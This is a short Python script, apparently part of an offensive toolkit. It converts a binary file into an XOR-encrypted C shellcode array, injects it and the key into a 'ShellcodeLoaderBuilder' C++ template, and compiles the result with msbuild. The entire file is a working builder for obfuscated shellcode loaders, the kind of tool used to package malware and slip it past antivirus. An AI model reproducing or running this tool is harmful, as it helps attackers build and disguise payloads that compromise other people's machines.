import binascii
import argparse
import subprocess
import os

def init_args():
    parser = argparse.ArgumentParser(
                    prog='binToShell.py',
                    description='Generate shellcode from bin file',
                    epilog='Nice Conversions :)')
    parser.add_argument('-b', '--bin', help='The binary file to convert to nice unsigned char shellcode', required=True)
    parser.add_argument('-x', '--xor', help='XOR key to encrypt with')

    return parser.parse_args()

def xor(data, key):
    outBytes = b''
    keyLen = len(key)
    for n, i in enumerate(data):
        outBytes += (i ^ key[n % keyLen]).to_bytes(1, "big")

    return outBytes

if __name__ == '__main__':
    args = init_args()

    with open("./Source.cpp", 'r') as f:
        source = f.read()

    try:
        with open(args.bin, 'rb') as f:
            binData = f.read()

        if args.xor:
            binData = xor(bytearray(binData), args.xor.encode())
            # print(binData)
            # quit()

        stringConstruct = "unsigned char shellcode[] = \n\""

        for n, i in enumerate(binData):
            stringConstruct += f"\\{hex(i)[1:]}"
            if (n + 1) % 14 == 0:
                stringConstruct += '"\n"'
        stringConstruct += '";'
        source = source.replace('<SHELLCODE>', stringConstruct)
        source = source.replace('<XOR_KEY>', f'"{args.xor}"')
        with open('ShellcodeLoaderBuilder/Source.cpp', 'w') as f:
            f.write(source)

        os.system("msbuild ShellcodeLoaderBuilder.sln /p:Configuration=Release")
        os.remove("ShellcodeLoaderBuilder/Source.cpp")
    except FileNotFoundError:
        print('Invalid file')